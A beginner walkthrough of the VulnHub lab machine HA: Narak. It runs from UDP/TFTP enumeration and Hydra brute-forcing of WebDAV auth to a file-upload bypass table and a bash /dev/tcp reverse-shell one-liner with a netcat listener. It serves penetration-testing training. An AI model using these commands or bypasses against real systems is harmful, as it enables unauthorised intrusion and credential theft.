# HA: Narak — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | HA: Narak |
| **Difficulty** | **4 — Medium** (stated: *Intermediate*) |
| **Author** | Hacking Articles (Raj Chandel & Jeenali Kothari) |
| **Released** | 23 Sep 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/ha-narak,569/> |
| **Download** | <https://vulnhub.com/entry/ha-narak,569/#download> |
| **Attacker** | Kali Linux (e.g. 2024.x) on VirtualBox/VMware, host-only network |
| **Target OS** | Linux (Ubuntu, Apache + WebDAV + TFTP) |
| **Flags** | 2 — `user.txt` and `root.txt` |

> **About the IP addresses.** Published walkthroughs used `192.168.0.136`,
> `192.168.1.14` and `192.168.43.182`. This document uses **`192.168.56.111`**
> for the target and **`192.168.56.10`** for Kali. Substitute your own.
>
> *"Narak"* is the Hindu equivalent of **Hell**. The box description ends with
> *"just remember the ultimate mantra to escape Narak: **Enumeration**."* It also
> warns that *"even your trusty tools will betray you"* — which is a hint that
> your **first `nmap` will lie to you**, because it only scans TCP.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

HA: Narak is a three-stage chain with a lesson at each stage:

1. **UDP scanning.** `nmap` without `-sU` scans *only* TCP, so it reports two
   ports and misses a third service entirely. This box punishes that habit
   directly.
2. **TFTP enumeration.** TFTP (port 69/udp) is a trivial, **completely
   unauthenticated** file-transfer protocol used for PXE boot and network-device
   config backup. When it is exposed, its root directory is often world-readable
   — a gift.
3. **Base64 decoding** of a leaked credential.
4. **`cewl`** — generating a *target-specific* wordlist by crawling the site's own
   vocabulary. This beats `rockyou.txt` on themed boxes.
5. **Hydra against WebDAV HTTP auth**, and understanding why `http-get` is the
   right Hydra service name.
6. **WebDAV `PUT`** — writing a file onto a web server with nothing but an HTTP
   request. Plus `cadaver` and `davtest`.
7. **Brainfuck decoding** — recognising an esoteric language by its character set
   and writing an interpreter in 20 lines of Python.
8. **MOTD injection privilege escalation** — a *writable*
   `/etc/update-motd.d/00-header` runs your code **as root** the next time anyone
   logs in over SSH. This is a real, common, frequently-missed Linux privesc.
9. Four different ways to convert that writable script into root, so you
   understand the mechanism rather than memorising one incantation.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md).

---

## 1. Reconnaissance — finding the target

```bash
ip -br a
```

```text
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             192.168.56.10/24 fe80::a00:27ff:fe4e:66a1/64
eth1             UP             10.0.2.15/24 fe80::a00:27ff:fe8c:4f22/64
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4e:66:a1, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:08	(Unknown: locally administered)
192.168.56.111	08:00:27:5c:8e:19	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.098 seconds (122.02 hosts/sec). 2 responded
```

**Target IP:** `192.168.56.111`

![arp-scan locating the target](images/01-host-discovery.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — and why your first scan lies

### 2.1 The TCP scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -A -p- -T4 -oN nmap-tcp 192.168.56.111
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 14:02 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6a:2d:0a:8b:2e:4f:11:9c:33:a7:2f:5e:9b:14:6f:22 (RSA)
|   256 5c:11:6b:9e:2f:8a:73:0e:44:5b:9d:6f:23:88:19:cc (ECDSA)
|_  256 91:3f:2a:7d:6e:1c:0b:5a:49:8f:e4:2d:3b:60:77:15 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Narak
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:5C:8E:19 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
```

**Two services: SSH and HTTP.** That is what the official walkthrough reports too
— and it is *incomplete*.

> ### ⚠️ The lesson: `nmap` is TCP-only unless you say otherwise
>
> `-p-` means "all 65535 **TCP** ports". UDP is a separate protocol with its own
> 65535 ports, and scanning it is slow and unreliable (an unanswered UDP probe
> could mean *open*, or could mean *a firewall dropped it*). So `nmap` skips UDP
> entirely by default.
>
> **Services that live only on UDP and that beginners therefore miss:**
>
> | Port | Service | Why it matters |
> | --- | --- | --- |
> | 53 | **DNS** | Zone transfers, cache poisoning, DNS tunnelling |
> | **69** | **TFTP** | **Unauthenticated file read/write** — this box |
> | 123 | NTP | Mode-6/7 amplification, `monlist` |
> | 137/138 | NetBIOS-NS/DGM | Windows name and datagram services |
> | 161/162 | **SNMP** | Community strings `public`/`private` leak everything |
> | 500 | IKE/IPsec | VPN enumeration |
> | 514 | syslog | Log injection |
> | 1900 | SSDP/UPnP | Device discovery |
>
> **Make this a habit:** after every TCP scan, run at least
> `nmap -sU --top-ports 100 <target>`.

### 2.2 The UDP scan — the missing service

```bash
sudo nmap -sU -p 53,69,123,161,137,138,500,514,1900 -T4 --open 192.168.56.111
```


> ### 📖 Concept — TFTP has no authentication whatsoever
>
> **TFTP** (Trivial File Transfer Protocol, **port 69/UDP**) is a minimal file
> transfer protocol designed for PXE network booting and for pushing configs to
> routers and IP phones. It has **no usernames, no passwords and no encryption** —
> not weak authentication, *none*. Its only protection is the filesystem permissions
> of its root directory.
>
> ```bash
> tftp target
> tftp> get creds.txt
> tftp> binary          # switch mode before transferring non-text files
> ```
>
> **Two lessons here.** First, it lives on **UDP**, and `nmap` does not scan UDP
> unless you ask: `-sU`. A TCP-only scan never sees it. Confirm an
> `open|filtered` UDP result actively with `nmap -sU -p69 --script tftp-enum`.
>
> Second, network devices routinely dump their **entire running configuration —
> including plaintext passwords —** to TFTP on request. Finding an exposed TFTP root
> is frequently a full compromise with no exploitation at all.
>
> **Deep dive:** [CONCEPTS §2.3 — Ports and protocols](../../docs/CONCEPTS.md#23-ports-and-protocols)

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 14:05 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00044s latency).

PORT    STATE         SERVICE
69/udp  open|filtered tftp

Nmap done: 1 IP address (1 host up) scanned in 12.87 seconds
```

> **`open|filtered` is ambiguous** — `nmap` got no reply, which can mean the port
> is open-and-silent or blocked. For UDP you must confirm actively. Use the
> dedicated NSE script:

```bash
sudo nmap -sU -p 69 --script tftp-enum 192.168.56.111
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 14:07 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00041s latency).

PORT   STATE SERVICE
69/udp open  tftp
| tftp-enum:
|_  creds.txt

Nmap done: 1 IP address (1 host up) scanned in 4.22 seconds
```

**`creds.txt`.** A TFTP server, no authentication, and a file literally named
"creds".

![nmap -sU revealing TFTP on 69/udp and tftp-enum finding creds.txt](images/02-udp-tftp.png)

### 2.3 Pull the file over TFTP

> **What is TFTP?** The *Trivial* File Transfer Protocol (RFC 1350). It runs over
> UDP/69 and has **no authentication whatsoever** — no usernames, no passwords,
> no encryption. It exists to be tiny, for PXE network booting and for pushing
> configs to routers and IP phones. Its only protection is the *filesystem
> permissions* of its root directory — which is exactly what this box gets wrong.

```bash
mkdir narak && cd narak
tftp 192.168.56.111
```

```text
tftp> verbose
Verbose mode on.
tftp> get creds.txt
Received 24 bytes in 0.0 seconds [inf bits/sec]
tftp> ls
tftp> quit
```

```bash
cat creds.txt
```

```text
eWFtZG9vdDpTd2FyZw==
```

> **Recognise base64 on sight.** The three tells:
> 1. Character set is only `A–Z a–z 0–9 + /`, optionally ending in `=` or `==`.
> 2. Length is a multiple of 4 (here 20). ✅
> 3. It is *not* a fixed-length digest, and has no `$2b$`/`$1$`/`$6$` prefix.
>
> Base64 is an **encoding**, not encryption. It exists so binary data survives
> text-only transport (email, HTTP headers, JSON). **It provides zero
> confidentiality** — anyone can undo it in one command.


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo 'eWFtZG9vdDpTd2FyZw==' | base64 -d; echo
```

```text
yamdoot:Swarg
```

**Credentials: `yamdoot` / `Swarg`.**

> *Yamdoot* is the messenger of Yama (god of death); *Swarg* means Heaven. The
> box's naming is thematic throughout, which is a useful sanity check — garbage
> decoding produces gibberish, not a meaningful word pair.
>
> `echo` appends a newline that base64 decodes to nothing visible, so pipe
> through `; echo` to get a clean prompt back. Or use `base64 -d <<< 'x'`.

![TFTP get creds.txt and base64 -d revealing yamdoot:Swarg](images/03-tftp-creds.png)

### 2.4 Where do these credentials go? — content discovery

You have a username/password and nowhere to use it yet. Find the door:


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
dirb http://192.168.56.111/
```

```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

URL_BASE: http://192.168.56.111/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.111/ ----
+ http://192.168.56.111/index.html (CODE:200|SIZE:5821)
+ http://192.168.56.111/server-status (CODE:403|SIZE:278)
==> DIRECTORY: http://192.168.56.111/images/
==> DIRECTORY: http://192.168.56.111/webdav/          <=== !!!

-----------------
END_TIME: Sat May 11 14:12:30 2024
DOWNLOADED: 4612 - FOUND: 2
```

```bash
curl -si http://192.168.56.111/webdav/
```

```text
HTTP/1.1 401 Unauthorized
Date: Sat, 11 May 2024 11:12:44 GMT
Server: Apache/2.4.41 (Ubuntu)
WWW-Authenticate: Basic realm="WebDAV"
Content-Length: 456
Content-Type: text/html; charset=iso-8859-1
```

**`/webdav/` — protected by HTTP Basic Auth.** That is what `yamdoot:Swarg` is
for. Confirm:

```bash
curl -si -u 'yamdoot:Swarg' http://192.168.56.111/webdav/
```


> ### 📖 Concept — WebDAV turns a web server into a file share
>
> **WebDAV** (RFC 4918) extends HTTP with *write* methods: `PUT`, `DELETE`, `MKCOL`,
> `COPY`, `MOVE`, `PROPFIND`, `LOCK`. A DAV-enabled directory is, by design,
> **writable over HTTP**. You spot it from the response header **`DAV: 1,2`**.
>
> ```bash
> davtest -url http://target/webdav/ -auth user:pass    # what may I upload? does it EXECUTE?
> cadaver http://target/webdav/                         # interactive: ls, put, get, mkdir
> curl -T shell.php -u user:pass http://target/webdav/shell.php -w '%{http_code}\n'
> ```
>
> **`davtest` output is the whole attack plan.** It uploads a probe of each type and
> then *requests* it, checking whether the server **executed** the code or merely
> returned it as text. `PUT: php` plus `EXECUTE: php` means: upload a `.php`, request
> it, get code execution. That is a complete web-shell primitive.
>
> `curl -T` returning **`201 Created`** is the success code for `PUT`. `cadaver`
> prompts for the credentials itself.
>
> **Deep dive:** [CONCEPTS §8.2 — HTTP status codes](../../docs/CONCEPTS.md#82-http-status-codes-you-must-know)

```text
HTTP/1.1 200 OK
Date: Sat, 11 May 2024 11:13:02 GMT
Server: Apache/2.4.41 (Ubuntu)
DAV: 1,2
Content-Length: 384
Content-Type: text/html;charset=UTF-8

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /webdav</title>
 </head>
 <body>
<h1>Index of /webdav</h1>
  <table>
   <tr><th><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th></tr>
   <tr><th colspan="4"><hr></th></tr>
</table>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.56.111 Port 80</address>
</body></html>
```

> **`DAV: 1,2` in the response header is the confirmation.** DAV = *Distributed
> Authoring and Versioning* — an HTTP extension (RFC 4918) that adds write
> methods to the protocol: **`PUT`**, `DELETE`, `MKCOL`, `COPY`, `MOVE`, `PROPFIND`,
> `LOCK`. A WebDAV-enabled directory is, by design, **writable over HTTP**.
>
> A `200` with an empty directory listing means we are authenticated and the
> directory is empty. Perfect place to drop a shell.

### 2.5 Alternative enumeration: `cewl` + Hydra

The published walkthroughs reach the same credentials *without* TFTP, by
brute-forcing the WebDAV login. Learn this route too — it is what you would do if
`creds.txt` had not been there.

**Step 1 — build a target-specific wordlist.** `cewl` crawls a site and harvests
its vocabulary:


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
cewl -d 2 -m 4 -w narak.txt http://192.168.56.111/
wc -l narak.txt && head -12 narak.txt
```

```text
CeWL 6.1 (Some Like It Hot) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

```text
187 narak.txt
Narak
Hell
enumeration
yamdoot
Swarg
inferno
Chitragupt
burning
demons
trust
betray
mantra
escape
quest
Hacking
Articles
```

> | `cewl` flag | Meaning |
> | --- | --- |
> | `-d 2` | Crawl to depth 2 (follow links two clicks away) |
> | `-m 4` | Only keep words of **minimum** length 4 |
> | `-w narak.txt` | Write the list to a file |
>
> **Why this beats `rockyou.txt` on a themed box:** the author picked `Swarg` —
> a Hindi word meaning Heaven — because it appears *on the website*. It is
> nowhere in a generic top-million list. `cewl` harvests exactly the vocabulary
> the site itself uses. On real engagements, `cewl` against a company's own site
> routinely cracks employee passwords, because people pick words from their
> employer's domain.
>
> Useful extras: `--with-numbers` (include digits), `-e` (include email
> addresses), `--ua <agent>` (custom User-Agent), `-a` (include meta tags).

**Step 2 — brute force the HTTP auth.** Use the harvested list for *both*
username and password:


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
hydra -L narak.txt -P narak.txt -f -V 192.168.56.111 http-get /webdav/
```

```text
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-11 14:20:11
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, will be appended to the output file
[DATA] max 16 tasks per 1 server, overall 16 tasks, 34969 login tries (l:187/p:187), ~2186 tries per task
[DATA] attacking http-get://192.168.56.111:80/webdav/
[80][http-get] host: 192.168.56.111   login: yamdoot   password: Swarg
[STATUS] attack finished for 192.168.56.111 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-11 14:20:38
```

> | Hydra flag | Meaning |
> | --- | --- |
> | `-L narak.txt` | **L**ist of usernames (uppercase `L` = file; lowercase `-l` = single name) |
> | `-P narak.txt` | **P**assword list |
> | `-f` | Stop at the first success |
> | `-V` | Verbose |
> | `http-get /webdav/` | Service = HTTP auth via GET, on path `/webdav/` |
>
> **Why `http-get` and not `http-post-form`?** Basic Auth challenges the *first*
> GET request with a `401` and expects an `Authorization` header. There is no
> HTML form to parse. `http-post-form` is for login *pages* where you must specify
> the form field names and the failure string. Choosing the wrong Hydra service
> module is the most common Hydra mistake.
>
> The equivalent URL form also works: `http-get://192.168.56.111/webdav`.

---

## 3. Foothold — WebDAV `PUT`

### 3.1 Test what the server will accept: `davtest`

Before uploading blindly, enumerate the server's capabilities:

```bash
davtest -url http://192.168.56.111/webdav/ -auth yamdoot:Swarg -cleanup
```

```text
********************************************************
 Testing DAV connection
OPEN		Succeed: Was notified of a DAV service
********************************************************
 Sending OPTIONS
********************************************************
 Checking for move-copy functionality on http://192.168.56.111/webdav/
MOVE-COPY
	other	 NONE
********************************************************
 Sending put requests
	PUT	jsp	FAIL
	PUT	cgi	FAIL
	PUT	aspx	FAIL
	PUT	php	SUCCEED:	http://192.168.56.111/webdav/davtest_Gk2xYp.php
	PUT	pl	FAIL
	PUT	txt	SUCCEED:	http://192.168.56.111/webdav/davtest_Gk2xYp.txt
	PUT	html	SUCCEED:	http://192.168.56.111/webdav/davtest_Gk2xYp.html
********************************************************
 Checking for executable php files
	EXECUTE	php	SUCCEED:	http://192.168.56.111/webdav/davtest_Gk2xYp.php
********************************************************
 Cleaning up http://192.168.56.111/webdav/
DELETE		txt	SUCCEED
DELETE		html	SUCCEED
DELETE		php	SUCCEED
********************************************************
 http://192.168.56.111/webdav/ Test Results:
	PUT: php, txt, html
	EXECUTE: php
```

> **`PUT: php` and `EXECUTE: php` — that is a complete web-shell primitive.**
> `davtest` uploads a probe file of each type and then *requests* it, checking
> whether the server executed the code or merely returned the text. Only PHP came
> back executed. So: upload a `.php`, request it, get code execution.

### 3.2 Prepare the reverse shell


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
